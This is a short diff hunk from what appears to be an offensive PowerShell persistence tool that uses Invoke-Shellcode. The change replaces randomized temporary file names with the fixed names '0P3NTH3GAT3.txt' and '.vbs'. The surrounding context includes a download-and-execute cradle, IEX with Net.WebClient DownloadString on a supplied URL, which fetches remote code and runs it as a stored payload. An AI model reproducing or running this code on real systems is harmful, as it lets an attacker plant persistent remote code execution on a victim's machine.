@@ -60,10 +60,11 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        [String]$Arguments
     )
 
-    $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
-    $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
-    $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
-    $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
+   # $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
+    $textFile = "0P3NTH3GAT3.txt"
+    #$textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
+    $vbsFile = "0P3NTH3GAT3.vbs"
+    #$vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
 
     #Store Payload
     $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"
